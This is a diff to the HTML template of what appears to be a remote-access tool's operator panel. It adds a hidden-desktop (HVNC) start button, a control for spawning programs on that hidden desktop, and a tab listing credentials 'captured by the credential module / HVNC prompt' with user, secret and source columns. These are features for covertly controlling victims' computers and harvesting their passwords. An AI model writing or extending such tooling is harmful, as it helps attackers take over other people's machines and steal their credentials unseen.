@@ -19,10 +19,14 @@
     <button class="tab" data-tab="files">files</button>
     <button class="tab" data-tab="procs">processes</button>
     <button class="tab" data-tab="info">info</button>
+    <button class="tab" data-tab="creds">credentials</button>
   </div>
   <section class="panel" id="tab-desktop">
     <div class="rd-bar">
       <button id="rd-connect">connect desktop</button>
+      <button id="hvnc-start">start hidden desktop (HVNC)</button>
+      <input id="hvnc-spawn" placeholder="spawn on hidden desktop (e.g. notepad.exe)">
+      <button id="hvnc-spawn-go">spawn</button>
       <span id="rd-status" class="dim">helper not connected</span>
     </div>
     <canvas id="rd-canvas" width="1024" height="768" tabindex="0"></canvas>
@@ -43,6 +47,11 @@
     <tbody id="procs-body"></tbody></table>
   </section>
   <section class="panel hidden" id="tab-info"><pre id="info-body" class="mono"></pre></section>
+  <section class="panel hidden" id="tab-creds">
+    <p class="dim">Credentials captured by the credential module / HVNC prompt.</p>
+    <table class="grid"><thead><tr><th>when</th><th>user</th><th>secret</th><th>source</th></tr></thead>
+    <tbody id="creds-body"></tbody></table>
+  </section>
 </main>
 {% endblock %}
 {% block scripts %}
